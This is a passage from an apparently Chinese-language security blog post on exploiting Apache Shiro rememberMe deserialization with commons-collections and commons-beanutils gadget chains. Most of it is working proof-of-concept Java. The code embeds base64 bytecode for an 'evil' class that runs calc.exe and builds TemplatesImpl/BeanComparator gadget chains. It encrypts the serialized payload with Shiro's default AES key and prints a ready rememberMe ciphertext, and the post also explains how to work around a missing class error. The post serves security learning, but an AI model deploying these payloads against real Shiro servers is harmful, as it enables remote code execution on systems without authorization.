class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">Impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>],<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, invokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, Impl);</span><br><span class="line">        map.put(e, <span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        outerMap.clear();</span><br><span class="line"></span><br><span class="line">        setValue(invokerTransformer,<span class="string">&quot;iMethodName&quot;</span>,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(map);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line"></span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(barr.toByteArray(), key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String filedname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rwsHEebZoL7IAzmRvehWqH86Yvab+tPzcmpOlzOk/AGjbYZgTYX6QlUOOU8GvX5Ycwb3GHiBpBbmEyBNqXHmtXlY3x048z2A03t80LVEYZXiuqEInZsH55Sr5+DhacRnl+H8icvUedtxblk3UtPtuBaEPQoKGKerznAxL4dp516zBypUBjg1jfdbJjQ49yGcKgiV7PyEaSEyB1H+nrA3XnpKbeiOOK9ljTJG9i396J1xrXypPCavzWWb48ud/fTMb/yUu34blzvtnZavPjqs4r3byWWcP+9bNdFosDY58ezZylJH8oenEtQ12Rmt/DAiaXASVcf/g+0nb4jLaJRV6gk1hO7dMclRKYjln1eWTn7Ma54aZzYxBUMaAHNTrIgNuIM9UNVr25EJrXWJ++RtIF10WkLWck2qtjxmmO2+9pNS/+b71L9Y+6yfu3Qho2EqaoOxggGd328bct4ORCDG78Jakz0yN9McaaMHogpY1JzMuAQGCxtDRGPKeHLSIxSJTb6iCQysQae+meXiBlw9hESTLHboAsS/AmZbNAaStAJG9PhDtdfsQYDHHRPf1PSwUAotkFyl9IB9yBSMU3sytTCUnqZNDTEEFzN98x+7MD2RuaSQtbHELajP5DVDUeH9qfNlNSYplZWY/rHdwiC8fM6lAh9XnGuEkMKb22qDNfyEdbIbxGDDcjN77uzilt6xo7pcwW9rbzB3E2fQrgW32ebvrIHxJ0YNCd/jtEnFa9ieQau3UrceFnS6XFVLHbiW2U4amAAZGSdyMcizdST+R5ZVJFNvDE+/lIUGUNgn33SyRWcfTSHnMqWWoN9UE1JtglXmEwHNDN9QxaWigrP+CF0UfKcgEZqJkLzahHZGBe/aafnloJGLVTy347BDylpTDO4nKxtN7BaKatrVWEKKi7EyMWeoA149jdQEND6aO8VsYrhwcHpZcvaw+02hijMynSzoklzrlmTXCVBZqmC5EL7RLlrc2QeXJ7WUXRGQzLiJAyhieCoKLwMxgImfRduHGvI5Rx1s/hvGcAESsRQaphm4vOQXmMgdvosnkqnxNDARxDmVrr6zeFKx75MtDce6sIWnd+IQi77IJomiOptm7DymDqtX25A8XnIhPcqPUvCOUODC03yGcQD9TbUsYAIVXBljmKTLdKwhcFsu0E0qnyxIOfjuKVbFMZQf+yxNAOnt4eaaodw8ZwdySghhmCpAsBPviwC86xtFLi3o5TPT+kYOj8uuNUgmU+K476t0HOqt8yGjHYu4vVU4SjE6xFTLETFG58yeCWFC/xAFWUoMrHDQsqXc40O1rVgblFXT0O7FZ8unJMH4u0uqNXmUWj8z65f2qtfD8MXwPtKFHOeeUXxU81G/vuZWkzJLZ7xtHUfA9KBpt1yEVS9pc73yR8ICZmJLneF4PF6EUztCoBh88erxEKhI08N+M0tfUiB4mPb7GiPxYvKnZNH6LeJ8KjOp7xLM3vscBi4wG3czzQlpJbLpJ35NhikVIDxq+BNKqhFeK7XyR0Pg6Lom0Ba20fMEEwUnGXIY5YXOm3FnAtzsH0JJHvY/YN2GqtIr5ByiydasBfDQ4mPVt1ncN8FC1qrusdzQ3xy19zh4FeCkusnP7HAimcTixPa/YTvqO1vSHAFlMzkIgVR+eDVZrYlYXDWvHIDVuNoPplbH434Nfcgc1eBbRlUFy+PZgyp0Ocq9i8f5dpmOVktTcsvuKg8S3oM+teiZ7ZJPYmwmuX2wSbi4JcPVLsH7KG3LCjHibu/Y9jcZxNjkG4LXTEJUofD2oPLGh+kDk1zURXF+8lIBf/ebZtqpHhkS6r9DCpCXBK0Ld7bYhSZDwzqzcWXwYyKqq08fWzxt8RLzPp1CwuAerAp/S/pSAdcv61gaWLo29TjvQj3EYZpIijw6h4vHCGCayzpaELr7UJkkB4CQqxuySUsE9xfq/2+3uSRo19WfhzoAW83d8XY1hu4WsLxsMsQynxw78eDRNDYQTls6lbOo+2l9o+zoKa94wvhFSfvbTLtB0YU9Skk98NqwtLcpu3lX5D6FHRLhQOL8wktGsBHnOquYIeQjCWmaSWOdQyVK1WDQoD7rQuISUgC1b3sgReuXtNRPw0wWu4NXLdX0wNEEEith5VJjdQ+jafRRHd1Y40DWmhRPB/uU07A5XQqdYC93RrIGUOaTLvcgJtTcTA1zEkIOrNqRIJwLU4Rkt7FwMahasYGzfe2NlQU//iHL1wTfzK45GOOYWJy76EEUH65r97gY9LXDzRA3pJRT9elJG9B1VTrXvS1A9miCOv/aZETritiHY4KjxCx9UFDTw14rXyIfFzSFEO0wTMzPh0DZCzHjLWWrEXkGLdpHDAWoxA5LTrFDH13ry3PpFkmrM+xFzbXDXdvuQYNOm6iXCEVI+Mrk0i5rsOWXBq6kc3NfOPZqhbdvW5Rf92KicFHBx8eARum/ribDRGlQ0m+oPkqMT5PAclBtM8OMa0tdGfD8rlM4/vcSdl4dl9bVvVQyWblL7dp6k5cWiCyk0MV6/e1d1uIA4VllW4mATxbr8viB0yioxCUzykXc/F8fQBQ/N8bMsISFjfu4t9O+F9jra1Q6JfRrf07Pmw2m+yIwm+FWCAYKwsrAPD2BJfDYWUFa42lkCPA3aZRjBZmAhZKZfaTwJOnrg5nkJIXoGY0dtB2F3aBQBrjbLi0V1+PPT2KgigvBsDnf/RrUjDKtdk34R/me2ZhBeG0a7dcXUwKyGco6B3CnvgUXEJp/AO+fZwqYS+FJ5lzchu3bl9yUpg9OxsQJXvYp5Nxt25ws1FT52ecVdr/NvpLawBe1c0D7xoXniNoSk1cae9hlqTZzWE6cxxG0FtuLz0Q5qCt14MomJz53qfVz7iwiN6uHRVZC0YYVUXJZTq/SX5vpdSaU3n524UcZQ/MReOb52dRi5a/aUv1PP7vedjDqaR0MLa56mqN75txBtXrbZFW7BoihLehcKddTqve+BsE=</span><br></pre></td></tr></table></figure><p><img src="/archives/2f569ddd/image-20250921154254459.png" alt="image-20250921154254459"></p><p>成功弹计算机</p><h3 id="CB攻击"><a href="#CB攻击" class="headerlink" title="CB攻击"></a>CB攻击</h3><p>在我们引入shiro依赖时其实会自动引入commons-beautils包。并且如果我们剔除commons-collections依赖shiro web依然能够正常运行，那么我们是否可以不通过CC依赖直接实现CB攻击呢?</p><p>先利用CB链的poc生成payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;B1uel0n3&quot;</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,beanComparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Object[] queueArray=(Object[]) getValue(queue,<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queueArray[<span class="number">0</span>]=templates;</span><br><span class="line">        queueArray[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line"></span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(barr.toByteArray(), key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String filedname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String filedname)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/2f569ddd/image-20250921161227863.png" alt="image-20250921161227863"></p><p>当remeberMe值发送时会报错加载不了ComparableComparator类</p><p>同时有个坑点就是当使用了与环境中不同版本的commons-beautils依赖编写POC时，发送poc会报错，需要相同的commons-beautils版本</p><p>发生上面的报错是因为ComparableComparator类是CC依赖里面的类，当我们创建BeanComparator对象是会调用它的构造函数：<br><img src="/archives/2f569ddd/image-20250921161450985.png" alt="image-20250921161450985"></p><p><img src="/archives/2f569ddd/image-20250921161505599.png" alt="image-20250921161505599"></p><p><img src="/archives/2f569ddd/image-20250921161518956.png" alt="image-20250921161518956"></p><p>此时就无法加载该类</p><p>所以我的思路就是comparator的值，不调用ComparableComparator类，即找一个Comparator接口类型的对象来替换ComparableComparator.getInstance()，且该类需要实现java.util.Comparator接口</p><p>由于需要进行序列化、反序列化过程，所以还需要实现java.io.Serializable接口</p><p>这里找到CaseInsensitiveComparator类：<br><img src="/archives/2f569ddd/image-20250921163428292.png" alt="image-20250921163428292"></p><p>而它的常量可以实例化该类</p><p>所以修改POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>,String.CASE_INSENSITIVE_ORDER);</span><br></pre></td></tr></table></figure><p><img src="/archives/2f569ddd/image-20250921163933273.png" alt="image-20250921163933273"></p><p>可运行时报错了，这是因为在调用add方法时，会调用offer方法：</p><p><img src="/archives/2f569ddd/image-20250921164041377.png" alt="image-20250921164041377"></p><p>在学CC2的时候就知道它会调用compare方法</p><p><img src="/archives/2f569ddd/image-20250921164152480.png" alt="image-20250921164152480"></p><p>这里调用的是java.lang.String$CaseInsensitiveComparator.compare方法，而该方法接受的是两个字符串，修改poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">queue.add(<span class="string">&quot;1&quot;</span>);</span><br></pre></td></tr></table></figure><p>最终POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BY